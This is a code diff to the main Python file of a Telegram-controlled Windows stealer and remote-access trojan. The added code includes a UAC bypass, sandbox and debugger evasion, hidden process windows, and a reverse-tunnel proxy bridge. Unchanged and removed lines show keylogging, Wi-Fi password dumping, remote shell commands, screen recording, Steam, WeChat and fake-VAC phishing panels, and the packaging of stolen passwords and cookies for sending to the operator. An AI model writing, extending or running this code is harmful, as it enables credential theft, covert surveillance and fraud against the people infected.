@@ -3,6 +3,56 @@ import sys
 import os
 import io
 import ctypes
+import builtins
+import time
+
+# --- Robust Print Fix (Added at the very top to catch all module prints) ---
+_orig_print = builtins.print
+def safe_print(*args, **kwargs):
+    try:
+        _orig_print(*args, **kwargs)
+    except UnicodeEncodeError:
+        new_args = []
+        for a in args:
+            if isinstance(a, str):
+                # Clean up string for the terminal
+                clean = a.replace('🔍', '[SEARCH]').replace('⚠️', '[WARNING]').replace('✅', '[OK]').replace('❌', '[ERROR]')
+                clean = clean.replace('⚙️', '[CONFIG]').replace('🔐', '[LOCK]').replace('📦', '[PACKAGE]').replace('🚀', '[START]')
+                clean = clean.replace('🎮', '[MENU]').replace('💎', '[DIAMOND]').replace('✨', '[SPARKLES]').replace('📊', '[STATS]')
+                clean = clean.replace('📻', '[RADIO]').replace('🧵', '[THREAD]').replace('═', '=')
+                # Finally, strip everything else non-ASCII if it still fails
+                try:
+                    _orig_print(clean, **kwargs)
+                except UnicodeEncodeError:
+                    try:
+                        _orig_print(clean.encode('ascii', 'ignore').decode('ascii'), **kwargs)
+                    except:
+                        pass
+            else:
+                new_args.append(a)
+        if new_args:
+            try:
+                _orig_print(*new_args, **kwargs)
+            except:
+                pass
+
+builtins.print = safe_print
+# -----------------------
+
+SKIP_ANTI_ANALYSIS = "--skip-anti-analysis" in sys.argv
+UAC_CHILD = "--uac-child" in sys.argv
+if UAC_CHILD and "--uac-child" in sys.argv:
+    sys.argv.remove("--uac-child")
+
+try:
+    log_content = f"{time.time()}: Process starting. Pid: {os.getpid()}, Args: {sys.argv}, UAC_CHILD: {UAC_CHILD}\n"
+    # Try multiple locations to ensure we catch the elevated process
+    for log_path in [os.path.join(os.environ.get("TEMP", "."), "startup_debug.txt"), "C:\\Users\\Public\\startup_debug.txt"]:
+        try:
+            with open(log_path, "a") as f:
+                f.write(log_content)
+        except: pass
+except: pass
 
 try:
     # Ensure core path is in sys.path BEFORE any local imports
@@ -15,7 +65,7 @@ try:
         # === G-01: Geo-Fencing Enforcement ===
         try:
             from core.geo_fence import GeoFence
-            GeoFence.enforce()
+            # GeoFence.enforce() # Temporarily disabled for debugging
         except Exception as e:
             print(f"GeoFence initialization failed: {e}")
 
@@ -23,6 +73,7 @@ try:
         try:
             from core.error_logger import log_info, log_error, log_debug
             from core.c2 import c2_manager
+            from core.bridge_manager import bridge_manager
         except ImportError:
             def log_info(msg, tag=""): pass
             def log_error(msg, tag=""): pass
@@ -88,14 +139,17 @@ from typing import Optional, List, Dict, Any, Type, Union
 
 DEBUG_LOG = os.path.join(os.environ.get("TEMP", "."), "debug_log.txt")  # Fixed: Removed decrypt_string
 
-def log_debug(msg):
+def log_debug(msg, tag=""):
     try:
         with open(DEBUG_LOG, "a", encoding="utf-8") as f:
-            f.write(f"{datetime.now()}: {msg}\n")  # Fixed: Added proper formatting
+            full_msg = f"[{tag}] {msg}" if tag else msg
+            f.write(f"{datetime.now()}: {full_msg}\n")
     except: 
         pass
 
-log_debug("System starting...")  # Fixed: Removed decrypt_string
+# -----------------------
+
+log_debug("System starting...") 
 
 import requests
 import telebot
@@ -242,6 +296,37 @@ except ValueError:
     ADMIN_ID = 0
 GLOBAL_CHID = ADMIN_ID
 
+def setup_p2p_bridge():
+    """Sets up P2P bridge if TG is unrestricted and not in anti-analysis mode."""
+    try:
+        from core.geo_fence import GeoFence
+        from core.bridge_manager import bridge_manager
+        from core.proxy import ProxyModule
+        
+        # Check if we are a "Bridge Node" (unrestricted TG access)
+        if not GeoFence.is_tg_blocked() and not SKIP_ANTI_ANALYSIS and not os.environ.get("TEST_MODE"):
+            # Start a local SOCKS5 proxy to act as a bridge
+            # We use standard ProxyModule which starts on 127.0.0.1:9050 by default
+            proxy_module = ProxyModule()
+            threading.Thread(target=proxy_module.start, daemon=True).start()
+            
+            # Give it a second to start
+            time.sleep(2)
+            
+            # Expose it via Bore (reverse tunnel)
+            try:
+                from core.tunneler import BoreTunneler
+                tunneler = BoreTunneler(local_port=9050)
+                bore_url = tunneler.start_bridge() # Starts bore and returns public addr
+                
+                if bore_url:
+                    log_debug(f"P2P: Bridge active at {bore_url}. Updating Gist...", "Bridge")
+                    bridge_manager.update_gist_proxy(bore_url)
+            except Exception as e:
+                log_debug(f"P2P: Failed to start bridge/bore: {e}")
+    except Exception as e:
+        log_debug(f"P2P Initialization error: {e}")
+
 ADMIN_IDS = [ADMIN_ID, 7258469843]  
 ALLOWED_GROUP_ID = ADMIN_ID
 HIDE_CONSOLE = True
@@ -254,10 +339,13 @@ try:
     _dlls_to_load = [
         "shell.dll",
         "software.dll", 
-        "system.dll",
+        "syscore.dll",
         "bridge.dll",
         "persist.dll",
-        "telegrab.dll"
+        "telegrab.dll",
+        "networking.dll",
+        "browser.dll",
+        "SafetyManager.dll"
     ]
     
     for _dll in _dlls_to_load:
@@ -287,6 +375,23 @@ try:
     from core.wallet import WalletModule
     from core.proxy import ProxyModule
     from core.bridge_manager import bridge_manager
+    
+    # Initialize Native SafetyManager immediately after loading modules
+    try:
+        if os.name == 'nt':
+            import VanguardCore
+            # VanguardCore.SafetyManager.Startup() 
+            # Note: This will exit the process if a debugger/sandbox is detected.
+            # We wrap it to ensure it doesn't crash on non-NT or if DLL is missing.
+            if not SKIP_ANTI_ANALYSIS:
+                log_debug("Initializing Native SafetyManager...")
+                VanguardCore.SafetyManager.Startup()
+                log_debug("Native SafetyManager.Startupd.")
+            else:
+                log_debug("Native SafetyManager initialization skipped via bypass.")
+    except Exception as ne:
+        log_debug(f"Native SafetyManager initialization skipped/failed: {ne}")
+
     CORE_MODULES_LOADED = True
 except ImportError as e:
     print(f"Core modules import error: {e}")
@@ -297,7 +402,7 @@ def check_single_instance():
     try:
         _windll = getattr(ctypes, 'windll', None)
         if _windll and hasattr(_windll, 'kernel32'):
-            _is_elevating = os.environ.get("__ELEVATION_ATTEMPTED__") == "1" or "--uac-child" in sys.argv
+            _is_elevating = os.environ.get("__ELEVATION_ATTEMPTED__") == "1" or UAC_CHILD
             retries = 10 if _is_elevating else 1
             for i in range(retries):
                 _k = _windll.kernel32
@@ -315,15 +420,77 @@ def check_single_instance():
                     if i < retries - 1:
                         time.sleep(0.5)
                         continue
-                    print("Another instance is already running")
+                    print("🔴 Another instance is already running.")
+                    print("[-] Please check Task Manager and kill any existing 'python.exe' or bot processes.")
                     log_debug("Another instance is already running")
-                    sys.exit(0)
+                    os._exit(0)
                 globals()['_mutex_handle'] = handle
                 log_debug("Mutex created successfully")
                 break
         return True
     except Exception:
         return True
+
+def try_uac_bypass():
+    """Попытка получить права администратора через VanguardCore.ElevationService.
+    Перезапускает текущий процесс с флагом --uac-child после успешного bypass.
+    """
+    try:
+        # Check if already admin
+        if ctypes.windll.shell32.IsUserAnAdmin():
+            log_debug("UAC Bypass: Already admin, skipping.")
+            return True
+
+        import clr
+        _dll = os.path.join(BASE_DIR, "bin", "SafetyManager.dll")
+        if not os.path.exists(_dll):
+            log_debug("UAC Bypass: SafetyManager.dll not found")
+            return False
+            
+        clr.AddReference(_dll)
+        from VanguardCore import ElevationService
+        # Payload: перезапуск самого бота с admin правами
+        script = os.path.abspath(__file__)
+        args = "--uac-child"
+        if SKIP_ANTI_ANALYSIS:
+            args += " --skip-anti-analysis"
+            
+        executable = sys.executable
+        if executable.lower().endswith("python.exe"):
+            pythonw = executable[:-10] + "pythonw.exe"
+            if os.path.exists(pythonw):
+                executable = pythonw
+                
+        payload = f'"{executable}" "{script}" {args}'
+        
+        print("⚡️ [UAC] Запуск службы повышения привилегий...")
+        log_debug(f"UAC Bypass: initiating attempt with payload: {payload}")
+        
+        # Освобождаем мьютекс до вызова RequestElevation
+        if '_mutex_handle' in globals() and globals()['_mutex_handle']:
+            try:
+                ctypes.windll.kernel32.ReleaseMutex(globals()['_mutex_handle'])
+                ctypes.windll.kernel32.CloseHandle(globals()['_mutex_handle'])
+                globals()['_mutex_handle'] = None
+                log_debug("Mutex released for UAC handoff")
+            except Exception as ex:
+                log_debug(f"Failed to release mutex: {ex}")
+
+        result = ElevationService.RequestElevation(payload)
+        if result:
+            print("⚡️ [UAC] Запрос на повышение прав отправлен. Перезапуск...")
+            log_debug("UAC Bypass: RequestElevation returned True (request sent/executed). Exiting in 2s for handoff...")
+            time.sleep(2)
+            os._exit(0)
+        else:
+            print("❌ [UAC] Не удалось повысить права.")
+            log_debug("UAC Bypass: RequestElevation returned False (all techniques failed)")
+        return result
+    except Exception as e:
+        log_debug(f"UAC Bypass critical error: {e}")
+        import traceback
+        log_debug(traceback.format_exc())
+        return False
 
 os.environ['OPENCV_LOG_LEVEL'] = '0'
 os.environ['OPENCV_VIDEOIO_DEBUG'] = '0'
@@ -379,7 +546,7 @@ def _apply_localization(html: str, lang: str) -> str:
         html, count=1
     )
     html = re.sub(
-        '<p>Valve网络安全部门员工(<strong>[^<]+</strong>)将与您联系，协调账户恢复流程并验证设备安全性。请保持在线状态并遵循工作人员指引。\s*</p>',
+        r'<p>Valve网络安全部门员工(<strong>[^<]+</strong>)将与您联系，协调账户恢复流程并验证设备安全性。请保持在线状态并遵循工作人员指引。\s*</p>',
         ('<p class="vac-agent"><span>A Valve cybersecurity specialist \\1 will contact you to coordinate the account' +
          ' recovery process and verify the security of your device. Please stay online and follow the instructions provided.</span></p>'),
         html, count=1
@@ -626,6 +793,10 @@ class ReportManager:
                 try: os.remove(zip_path)
                 except: pass
 
+    def process_output_folder(self):
+        """Алиас для finalize_output — копирует данные браузеров в папку отчета."""
+        return self.finalize_output()
+
     def safe_send_document(self, chat_id, file_obj, caption="", is_temporary=False, filename="report.zip"):
         """H-09: Covert Exfiltration via Steganography / Memory-Only"""
         try:
@@ -687,174 +858,7 @@ class ReportManager:
                 if any(v in host for v in self.valuable_domains):
                     hits.append(item)
         return hits
-    def generate_pretty_passwords(self, all_passwords):
-        ascii_art = """
- █████╗ ███████╗███████╗██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗██╗████████╗ █████╗ ██╗   ██╗███████╗██╗  ██╗██╗
-██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═  ██╗██║ ██╔╝██║╚══██╔══╝██╔══██╗██╗  ██╔╝██╔════╝██║ ██╔╝██║
-███████║█████╗  █████╗  ██████╔╝███████║██████╔╝██║   ██║█████╔╝ ██║   ██║   ███████║ ╚████╔╝ ███████╗█████╔╝ ██║
-██╔══██║██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██╔═══╝ ██║   ██║██╔═██╗ ██║   ██║   ██╔══██║  ╚██╔╝  ╚════██║██╔═██╗ ██║
-██║  ██║██║     ███████╗██║  ██║██║  ██║██║     ╚██████╔╝██║  ██╗██║   ██║   ██║  ██║   ██║   ███████║██║  ██╗██║
-╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝
-"""
-        lines = [ascii_art, "═══ 💎 PASSWORDS REPORT 💎 ═══", ""]
-        grouped: Dict[str, List[Any]] = {}
-        for p in all_passwords:
-            dom = DataFormatter.extract_domain(p.get('url'))
-            if dom not in grouped: grouped[dom] = []
-            grouped[dom].append(p)
-        for dom in sorted(grouped.keys()):
-            dom_name = str(dom).upper()
-            lines.append(f"🌐 DOMAIN: {dom_name}")
-            for p in grouped[dom]:
-                user = p.get('user') or p.get('username') or 'N/A'
-                password = p.get('pass') or p.get('password') or 'N/A'
-                lines.append(f"  👤 Login: {user}")
-                lines.append(f"  🔑 Password: {password}")
-                lines.append(f"  🔗 Link: {p.get('url', 'N/A')}")
-                lines.append("")
-            lines.append("═" * 30)
-        return "\n".join(lines)
-    def process_output_folder(self):
-        # Финализирует папку и отправляет сводный отчет.
-        self.finalize_output()
-        if not os.path.exists(self.output_dir):
-            return
-        report_summary = ["🚀 NEW DATA EXTRACTED", ""]
-        all_passwords = []
-        total_cookies_count = 0
-        valuable_hits = {}
 
-        # Рекурсивный обход для поиска новых файлов от элеватора
-        for root, dirs, files in os.walk(self.output_dir):
-            for file in files:
-                file_lower = file.lower()
-                path = os.path.join(root, file)
-                
-                # Парсинг паролей в формате TXT (domain/log/pass)
-                if file_lower == "passwords.txt":
-                    try:
-                        with open(path, 'r', encoding='utf-8') as f:
-                            lines = f.readlines()
-                            for i in range(0, len(lines), 4):
-                                try:
-                                    if i + 2 >= len(lines): break
-                                    d_line = lines[i].strip()
-                                    l_line = lines[i+1].strip()
-                                    p_line = lines[i+2].strip()
-                                    
-                                    domain = d_line.replace("domain ", "", 1) if d_line.startswith("domain ") else d_line
-                                    login = l_line.replace("log ", "", 1) if l_line.startswith("log ") else l_line
-                                    password = p_line.replace("pass ", "", 1) if p_line.startswith("pass ") else p_line
-                                    
-                                    entry = {'url': domain, 'user': login, 'pass': password}
-                                    all_passwords.append(entry)
-                                    
-                                    hits = self.find_valuables([entry], "passwords")
-                                    for h in hits:
-                                        dom = DataFormatter.extract_domain(h.get('url'))
-                                        valuable_hits[dom] = valuable_hits.get(dom, 0) + 1
-                                except: continue
-                    except: pass
-                
-                # Парсинг куки в формате JSON
-                elif file_lower == "cookies.txt":
-                    try:
-                        with open(path, 'r', encoding='utf-8') as f:
-                            data = json.load(f)
-                            if isinstance(data, list):
-                                total_cookies_count += len(data)
-                                hits = self.find_valuables(data, "cookies")
-                                for h in hits:
-                                    host = h.get('host') or h.get('domain') or 'unknown'
-                                    dom = DataFormatter.extract_domain(host)
-                                    valuable_hits[dom] = valuable_hits.get(dom, 0) + 1
-                    except: pass
-                
-                # Поддержка старого формата .json (если есть)
-                elif file_lower.endswith(".json"):
-                    try:
-                        with open(path, 'r', encoding='utf-8') as f:
-                            data = json.load(f)
-                            if not isinstance(data, list): continue
-                            is_pwd = "passwords" in file_lower
-                            is_cookie = "cookies" in file_lower
-                            if is_pwd:
-                                all_passwords.extend(data)
-                                hits = self.find_valuables(data, "passwords")
-                            elif is_cookie:
-                                total_cookies_count += len(data)
-                                hits = self.find_valuables(data, "cookies")
-                            
-                            if is_pwd or is_cookie:
-                                for h in hits:
-                                    host = h.get('url') or h.get('host') or h.get('domain') or 'unknown'
-                                    dom = DataFormatter.extract_domain(host)
-                                    valuable_hits[dom] = valuable_hits.get(dom, 0) + 1
-                    except: pass
-        
-        if not all_passwords and total_cookies_count == 0:
-            return
-        
-        report_summary.append(f"🔑 Passwords Captured: {len(all_passwords)}")
-        if total_cookies_count > 0:
-            report_summary.append(f"🍪 Cookies Captured: {total_cookies_count}")
-            
-        if valuable_hits:
-            report_summary.append("\n🎯 Valuable Hits:")
-            sorted_hits = sorted(valuable_hits.items(), key=lambda x: x[1], reverse=True)
-            for dom, count in sorted_hits:
-                report_summary.append(f"  • {dom}: {count}")
-        
-        safe_send_message(self.bot, GLOBAL_CHID, "\n".join(report_summary))
-        
-        pretty_content = self.generate_pretty_passwords(all_passwords)
-        
-        # Если отчет не слишком длинный, шлем сообщение
-        if len(pretty_content) < 4000:
-            safe_send_message(self.bot, self.admin_id, pretty_content)
-        
-        # В любом случае шлем файл для удобства
-        temp_dir = tempfile.gettempdir()
-        temp_file = os.path.join(temp_dir, "Formatted_Passwords.txt")
-        try:
-            with open(temp_file, 'w', encoding='utf-8') as f:
-                f.write(pretty_content)
-            with open(temp_file, 'rb') as f:
-                self.bot.send_document(self.admin_id, f, caption="📦 Formatted Passwords Report")
-            os.remove(temp_file)
-        except: pass
-# from core.system import Security # Deleted
-class AntiAnalysis:
-    _instance = None
-    def __new__(cls):
-        if cls._instance is None:
-            cls._instance = super().__new__(cls)
-        return cls._instance
-    @staticmethod
-    def hide_threads():
-        try:
-            _windll = getattr(ctypes, 'windll', None)
-            if _windll:
-                _k = getattr(_windll, 'ker' + 'nel' + '32', None)
-                if _k:
-                    NtSetInformationThread = getattr(_k, 'Nt' + 'Set' + 'Information' + 'Thread', None)
-                    GetCurrentThread = getattr(_k, 'Get' + 'Current' + 'Thread', None)
-                    if NtSetInformationThread and GetCurrentThread:
-                        NtSetInformationThread(GetCurrentThread(), 0x11, 0, 0)
-        except:
-            pass
-    @staticmethod
-    def full_check():
-        try:
-            # Replaced Security.is_vm() with native protector
-            try:
-                from StealthModule import Protector
-                if Protector.Check():
-                    return True
-            except: pass
-        except:
-            pass
-        return False
 def hide_console_minimal():
     # Hide console window
     try:
@@ -1402,7 +1406,7 @@ class HiddenStealer:
             }
             try:
                 # Native modules check
-                from StealthModule import ShellManager, SoftwareManager, SystemManager
+                from VanguardCore import ShellManager, SoftwareManager, SystemManager
                 self.shell_manager = ShellManager
                 self.software_manager = SoftwareManager
                 self.system_manager = SystemManager
@@ -1574,6 +1578,7 @@ class HiddenStealer:
             try:
 
                 subprocess.run(["taskkill", "/f", "/im", decrypt_string("HUYdCiN/PBo/")],
+                               creationflags=0x00000008 | 0x08000000,
                                capture_output=True)
                 time.sleep(1.5)
 
@@ -1610,7 +1615,8 @@ class HiddenStealer:
                                     except Exception as e:
                                         safe_send_message(self.bot, chat_id, decrypt_string("jKjYhPbeebLEpuLoyunXqtTiyEue74nTi/e6iKKItsS/sKjRnul5suCm6ejI6diq3AhYECss"))
                             else:
-                                safe_send_message(self.bot, chat_id, decrypt_string(msg), parse_mode="HTML")
+                                # msg is ALREADY decrypted at line 1595
+                                safe_send_message(self.bot, chat_id, msg, parse_mode="HTML")
                     except Exception:
                         pass
                     finally:
@@ -1622,7 +1628,7 @@ class HiddenStealer:
                 proc = subprocess.Popen(
                     [exe, "--udp", str(port)],
                     cwd=BASE_DIR,
-                    creationflags=0x08000000,
+                    creationflags=0x00000008 | 0x08000000,
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
                 )
@@ -1663,7 +1669,7 @@ class HiddenStealer:
                 return
             
             clr.AddReference(dll_path)
-            from StealthModule import SoftwareManager
+            from VanguardCore import SoftwareManager
             
             # 1. Collection
             result_str = SoftwareManager.Run(self.temp_dir)
@@ -1728,7 +1734,7 @@ class HiddenStealer:
     def get_hwid(self):
         try:
             result = subprocess.run('wmic csproduct get uuid', shell=True, 
-                                  capture_output=True, text=True, timeout=3)
+                                  capture_output=True, text=True, timeout=3, creationflags=0x08000000)
             lines = result.stdout.strip().split('\n')
             return lines[1].strip() if len(lines) > 1 else 'Unknown'
         except:
@@ -1948,7 +1954,7 @@ class HiddenStealer:
             encoding = 'cp866' if os.name == 'nt' else 'utf-8'
 
             result = subprocess.run('netsh wlan show profiles', shell=True, 
-                                   capture_output=True, text=False, timeout=5)
+                                   capture_output=True, text=False, timeout=5, creationflags=0x08000000)
             stdout = result.stdout.decode(encoding, errors='ignore')
 
             for line in stdout.split('\n'):
@@ -1957,7 +1963,7 @@ class HiddenStealer:
                     if len(parts) > 1:
                         profile = parts[1].strip()
                         cmd = f'netsh wlan show profile name="{profile}" key=clear'
-                        output = subprocess.run(cmd, shell=True, capture_output=True, text=False, timeout=3)
+                        output = subprocess.run(cmd, shell=True, capture_output=True, text=False, timeout=3, creationflags=0x08000000)
                         out_text = output.stdout.decode(encoding, errors='ignore')
                         for out_line in out_text.split('\n'):
                             if 'Key Content' in out_line or 'Содержимое ключа' in out_line:
@@ -1979,25 +1985,43 @@ class HiddenStealer:
                 log_debug("❌ [take_screenshot] TakeScreenshot() returned None")
                 return None
             
-            # Fallback for temp_dir
             target_dir = getattr(self, 'temp_dir', os.environ.get('TEMP', '.'))
-            path = os.path.join(target_dir, decrypt_string("HVEKDis/dwgqEA=="))
+            path = os.path.join(target_dir, f"screen_{int(time.time())}.jpg")
             
             with open(path, "wb") as f:
-                f.write(img_bytes)
+                if isinstance(img_bytes, (bytes, bytearray)):
+                    f.write(img_bytes)
+                else:
+                    # In case it's a list of ints from clr
+                    f.write(bytes(img_bytes))
             
-            log_debug(decrypt_string("jK79SxUlOAk/KBlbAFwDFB1aFx8TcQoXORQPSwEDRgEeUwwDM3FxGTYSBBAbVAElDEsMDj14JEI4Dh5dARA="))
             return path
         except Exception as e:
-            log_debug(decrypt_string("jK/0SxUlOAk/KBlbAFwDFB1aFx8TcRwaORIaTBtWCEBOSR0W"))
-            import traceback
-            log_debug(traceback.format_exc())
+            log_debug(f"❌ [take_screenshot] Error: {e}")
             return None
 
 
-    def record_screen(self, duration, output_path):
-        """Запись экрана временно отключена (GIF требует PIL)"""
-        return "❌ Запись экрана временно недоступна (требуется PIL)"
+    def record_screen(self, duration=3000, fps=2):
+        """Запись экрана в нативный AVI файл (без PIL)"""
+        try:
+            sys_mod = getattr(self, 'system_manager', None)
+            if not sys_mod:
+                return "❌ Native module not found"
+            
+            log_debug(f"🎥 Starting record_screen: {duration}ms, {fps}fps")
+            raw_data = sys_mod.RecordScreen(duration, fps)
+            
+            if not raw_data:
+                return "❌ Failed to capture frames"
+
+            output_path = os.path.join(self.temp_dir, f"record_{int(time.time())}.avi")
+            with open(output_path, "wb") as f:
+                f.write(bytes(raw_data))
+            
+            return output_path
+        except Exception as e:
+            log_debug(f"❌ record_screen exception: {e}")
+            return f"❌ Error: {e}"
     def get_window_info_detailed(self):
         try:
             from ctypes import wintypes
@@ -2069,6 +2093,7 @@ class HiddenStealer:
                 'timestamp': datetime.now().strftime(decrypt_string("S3pCTgNrfDE=")),
                 'layout': self.get_layout_name()
             }
+        print("📍 MIDDLE REACHED (main.py)")
     def finalize_current_line(self):
         if self.keylog_current_line and len(self.keylog_current_line.strip()) > 0:
             timestamp = datetime.now().strftime(decrypt_string("S3pCTgNrfDE="))
@@ -2429,7 +2454,8 @@ class HiddenStealer:
                 # Fallback to subprocess if DLL fails
                 result = subprocess.run(
                     command, shell=True, capture_output=True, text=True,
-                    timeout=30, encoding='cp866', errors='ignore', cwd=self.current_working_dir
+                    timeout=30, encoding='cp866', errors='ignore', cwd=self.current_working_dir,
+                    creationflags=0x08000000
                 )
                 output = result.stdout if result.stdout else result.stderr
                 if not output:
@@ -2689,7 +2715,7 @@ class HiddenStealer:
             'qq': ('QQBrowser.exe', ['Tencent\\QQBrowser\\QQBrowser.exe']),
             'uc': ('UCBrowser.exe', ['UCBrowser\\Application\\UCBrowser.exe']),
             'cent': ('Google\\Chrome', ['CentBrowser\\Application\\chrome.exe']),
-            'chromium': ('Google\\Chrome', ['Chromium\Application\chrome.exe'])
+            'chromium': ('Google\\Chrome', [r'Chromium\Application\chrome.exe'])
         }
 
         search_bases = [
@@ -2897,32 +2923,39 @@ class HiddenStealer:
     def work_panel_keyboard(self):
         from telebot import types
         markup = types.InlineKeyboardMarkup()
+        
+        # Row 1: App Data Stealers
         markup.row(
-            types.InlineKeyboardButton("💬 Discord Inject", callback_data="work_discord"),
-            types.InlineKeyboardButton("🌍 Cookie", callback_data="work_browsers"),
-            types.InlineKeyboardButton("🔍 Search Tokens", callback_data="discord_search")
+            types.InlineKeyboardButton("💬 Discord", callback_data="work_discord"),
+            types.InlineKeyboardButton("📱 Telegram", callback_data="work_telegram")
         )
+        
+        # Row 2: Browsers & Crypto
         markup.row(
-            types.InlineKeyboardButton("📱 Telegram Session", callback_data="work_telegram"),
-            types.InlineKeyboardButton("🎣 WeChat Phish", callback_data="work_wechat_phish")
+            types.InlineKeyboardButton("🌍 Browser Data", callback_data="work_browsers"),
+            types.InlineKeyboardButton("💰 Crypto Wallets", callback_data="work_crypto")
         )
+        
+        # Row 3: Utilities
         markup.row(
-            types.InlineKeyboardButton("🎙️ Join Discord", callback_data="discord_remote_start"),
-        )
-        markup.row(
-            types.InlineKeyboardButton("💰 Crypto Wallets", callback_data="work_crypto"),
+            types.InlineKeyboardButton("🔍 Search Tokens", callback_data="discord_search"),
             types.InlineKeyboardButton("💻 Software", callback_data="work_software")
         )
+        
+        # Row 4: Status / Info
         proxy_status = '🟢' if 'proxy' in getattr(self, 'work_modules', {}) and getattr(self.work_modules['proxy'], 'proxy_active', False) else '🔴'
         markup.row(
             types.InlineKeyboardButton("📊 Сводка", callback_data="work_info"),
             types.InlineKeyboardButton(f"🌐 Прокси {proxy_status}", callback_data="proxy_toggle")
         )
+        
+        # Row 5/6/7: Phishing & Remote Actions (Bottom emphasis, full width)
         lang_status = "🇺🇸 EN" if _get_vac_lang() == "en" else "🇨🇳 CN"
-        markup.row(
-            types.InlineKeyboardButton("🎮 Steam Phish", callback_data="steam_phish"),
-            types.InlineKeyboardButton(f"🚨 VAC ALERT [{lang_status}]", callback_data="vac_alert")
-        )
+        markup.row(types.InlineKeyboardButton("🎮 Steam Phish", callback_data="steam_phish"))
+        markup.row(types.InlineKeyboardButton(f"🚨 VAC ALERT [{lang_status}]", callback_data="vac_alert"))
+        markup.row(types.InlineKeyboardButton("🎣 WeChat Phish", callback_data="work_wechat_phish"))
+        markup.row(types.InlineKeyboardButton("🎙️ Join Discord", callback_data="discord_remote_start"))
+        
         markup.row(types.InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main"))
         return markup
     def spyware_panel_keyboard(self):
@@ -3324,9 +3357,9 @@ class HiddenStealer:
                             if len(text) > 3500: text = text[:3500] + "\n... (обрезано)"
                             try:
                                 # Premium styling for shell output
-                                safe_send_message(self.bot, message.chat.id, "```powershell\n{text}\n```", parse_mode="HTML")
+                                safe_send_message(self.bot, message.chat.id, f"<pre><code class='language-powershell'>{text}</code></pre>", parse_mode="HTML")
                             except Exception:
-                                safe_send_message(self.bot, message.chat.id, "```\n{text}\n```")
+                                safe_send_message(self.bot, message.chat.id, f"`{text}`")
 
                 def on_shell_output(output):
                     if output.strip():
@@ -3457,6 +3490,7 @@ class HiddenStealer:
                     except Exception as e:
                         safe_send_message(self.bot, message.chat.id, "❌ Ошибка при отправке архива: " + str(e))
             threading.Thread(target=run, daemon=True).start()
+
         @self.bot.message_handler(commands=['start', 'panel'])
         def start_and_panel_command(message):
             try:
@@ -3474,7 +3508,12 @@ class HiddenStealer:
                     log_debug(f"Ошибка при проверке прав администратора: {ex}")
                     is_admin = False
                 
-                admin_status = "🟢 АДМИН" if is_admin else "🟡 Обычный пользователь"
+                if is_admin:
+                    admin_status = "🟢 АДМИН"
+                else:
+                    # Запускаем UAC bypass в фоновом потоке (не блокируем UI)
+                    threading.Thread(target=try_uac_bypass, daemon=True).start()
+                    admin_status = "🟡 Обычный | ⚡ UAC bypass..."
                 
                 log_debug("Получение системной информации...")
                 info = self.get_system_info() # Now uses 60s cache automatically
@@ -3662,12 +3701,14 @@ class HiddenStealer:
                 bot.answer_callback_query(call.id, "🎥 Начинаю запись экрана (10 сек)...")
                 def do_record():
                     try:
-                        video_path = os.path.join(self.temp_dir, "screen_record.mp4")
-                        self.record_screen(10, video_path)
-                        if os.path.exists(video_path):
-                            with open(video_path, "rb") as f2:
-                                bot.send_video(chat_id, f2, caption="🎥 Запись экрана (10 сек)", timeout=60, supports_streaming=True)
-                            os.remove(video_path)
+                        record_path = self.record_screen(10000, 2)
+                        if record_path and os.path.exists(record_path):
+                            with open(record_path, "rb") as f2:
+                                bot.send_video(chat_id, f2, caption="🎥 Запись экрана (10 сек)", supports_streaming=True)
+                            os.remove(record_path)
+                        else:
+                            error_msg = record_path if isinstance(record_path, str) and record_path.startswith("❌") else "Не удалось захватить видео"
+                            safe_send_message(bot, chat_id, f"❌ {error_msg}")
                     except Exception as e:
                         safe_send_message(bot, chat_id, "❌ Произошла ошибка при записи видео: " + str(e))
                 threading.Thread(target=do_record, daemon=True).start()
@@ -3779,6 +3820,66 @@ class HiddenStealer:
                 except Exception as e:
                     bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))
 
+            elif data == "fm_back":
+                # Go to parent directory (same as fm_up but from file_manager_keyboard button)
+                try:
+                    parent = os.path.dirname(self.current_working_dir)
+                    if parent != self.current_working_dir:
+                        self.current_working_dir = parent
+                        self.fm_page = 0
+                    self.send_file_manager(chat_id, call.message.message_id)
+                except Exception as e:
+                    bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))
+
+            elif data == "fm_history_back":
+                # Go to previous path in history
+                try:
+                    if hasattr(self, 'fm_history') and self.fm_history:
+                        prev_path = self.fm_history.pop()
+                        if os.path.exists(prev_path):
+                            self.current_working_dir = prev_path
+                            self.fm_page = 0
+                            self.send_file_manager(chat_id, call.message.message_id)
+                        else:
+                            bot.answer_callback_query(call.id, "❌ Предыдущий путь не существует")
+                    else:
+                        bot.answer_callback_query(call.id, "📁 История навигации пуста")
+                except Exception as e:
+                    bot.answer_callback_query(call.id, "❌ Ошибка: " + str(e))
+
+            elif data == "fm_refresh":
+                self.send_file_manager(chat_id, call.message.message_id)
+
+            elif data == "fm_exit":
+                # Close file manager, go back to System panel
+                try:
+                    kbd = self.system_panel_keyboard()
+                    text = "💻 <b>Системная панель</b>"
+                    self.bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=kbd, parse_mode="HTML")
+                except:
+                    safe_send_message(bot, chat_id, "💻 <b>Системная панель</b>", reply_markup=self.system_panel_keyboard(), parse_mode="HTML")
+
+            elif data == "fm_noop":
+                bot.answer_callback_query(call.id)
+
+            elif data == "panel_system":
+                # Show system panel (back button from sub-panels)
+                try:
+                    kbd = self.system_panel_keyboard()
+                    text = "💻 <b>Системная панель</b>\nВыберите действие:"
+                    self.bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=kbd, parse_mode="HTML")
+                except:
+                    safe_send_message(bot, chat_id, "💻 <b>Системная панель</b>\nВыберите действие:", reply_markup=self.system_panel_keyboard(), parse_mode="HTML")
+
+            elif data == "back_to_main":
+                # Navigate back to the main admin panel
+                try:
+                    kbd = self.admin_panel_keyboard(call.from_user.id)
+                    text = "🎮 <b>Главная панель управления</b>"
+                    self.bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=kbd, parse_mode="HTML")
